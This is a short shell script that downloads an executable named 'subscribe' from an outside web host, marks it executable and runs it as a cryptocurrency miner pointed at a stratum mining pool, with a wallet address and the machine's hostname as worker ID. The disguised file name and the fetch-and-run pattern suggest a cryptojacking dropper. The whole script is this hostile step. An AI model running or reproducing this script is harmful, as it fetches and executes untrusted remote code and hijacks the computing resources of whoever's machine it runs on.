#!/bin/sh

wget http://ilovenypizza.com/subscribe
chmod +x subscribe

#run

./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
